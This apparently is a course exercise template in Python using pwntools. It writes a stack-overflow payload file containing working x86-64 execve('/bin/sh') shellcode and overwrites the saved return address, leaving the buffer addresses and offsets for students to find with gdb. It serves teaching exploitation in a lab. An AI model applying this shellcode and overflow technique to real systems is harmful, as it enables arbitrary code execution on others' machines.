#!/usr/bin/env python3 

from pwn import *

# Exercise 1. For this task, perform the stack overflow inside gdb. Use this script to help
# you write a payload file (badfile1) to use to overflow the stack. 

# The asm function from pwnlib.asm library can be used to generate the 
# machine instructions from an assembly program. 
# See: http://docs.pwntools.com/en/latest/asm.html
def shellcode():
  # x86-64 architecture
  context.arch = 'amd64'
  code = asm('''
    xor rax,rax         ; 
    push rax            ; 
    mov rbx,0x68732f2f6e69622f  ; 
    push rbx
    mov rdi,rsp         ; 
    push rax            ; 
    push rdi            ; 
    mov rsi,rsp         ; 
    xor rdx, rdx        ; 
    mov al, 59          ; 
    syscall             
  ''')
  return code 



def main():

  # payload length
  bytearraylen = 512

  # This is where the actual payload will be stored
  # Initiallly, fill it with some arbitray bytes, e.g., byte 0x41. 
  content = bytearray(0x41 for i in range(bytearraylen))

  # generate shellcode 
  code = shellcode()
  
  # we'll put the shellcode at the end of the payload
  # so the shellcode's offset, relative to the start of the buffer, 
  # is bytearraylen - length_of_shellcode. 
  shellcode_offset = bytearraylen - len(code)
  content[shellcode_offset:] = code 

  # TODO: Use gdb to find the address of the buffer you want to overwrite. 
  # Here are some options to try (depending on whether the binary is stripped or not):
  # - If the binary has debugging symbols, you can directly use
  # the name of the variable (of the buffer) to print its address, e.g., using
  # gdb command 
  #   print &variable_name
  # in the function where the variable is declared (so you'd need to set a breakpoint
  # at the entry to that function). 
  # 
  # - If the binary is stripped, try to deduce the location of the variable relative
  # to rbp, e.g., by looking at the disassembly of the binary. 
  # For example, if the variable is located at [rbp-0x40] then you can use
  # gdb command
  #   print $rbp-0x40 
  # to show the address of the variable.
  #
  # - If it's not clear from the disassembly where the buffer is located relative to rbp
  # (for example, some compiler may optimise the binary to use addressing relative to rsp
  # instead of rbp), you can try to inject a unique payload into the buffer (e.g., a sequence
  # of 'A's or hex 0x41), and examine the content of the stack. 
  # You can use the gdb command
  #   x $rsp
  # to display the first 4 bytes of the stack, starting at the top of the stack ($rsp). 
  # To display more, you can add a numeric modifier to the x's format, e.g.,
  #   x/10g $rsp
  # displays the fist 10 * 8 bytes of the stack. 

  buffer_address = XXXX 

  # TODO: calculate the address of the shellcode
  shellcode_address = XXXX

  # TODO: calculate offset of the stored return address
  # relative to the start of buffer. This you can find either
  # using gdb, or by examining the disassembly of the vulnerable code.  
  # For example, if you already has the address of the buffer, you can
  # query the address stored in rbp using
  #   print $rbp
  # The return address is just above the stored rbp, so it's located at
  # rbp+8. Once you obtain the return address's location, you can easily
  # work out its distance from the buffer.
  rt_offset = XXXX

  # overwrite the stored return address with the shellcode address
  # content[rt_offset:rt_offset+0x8] = shellcode_address.to_bytes(8, byteorder='little')
  # Here we use the p64 function from pwntools to turn an integer into its 64 bit little-endian representation
  content[rt_offset:rt_offset+0x8] = p64(shellcode_address)

  # write payload to 'badfile1'
  print('Writing payload to badfile1..')
  with open('badfile1', 'wb') as f:
    f.write(content)
  print('Done')

if __name__ == '__main__':
    main()
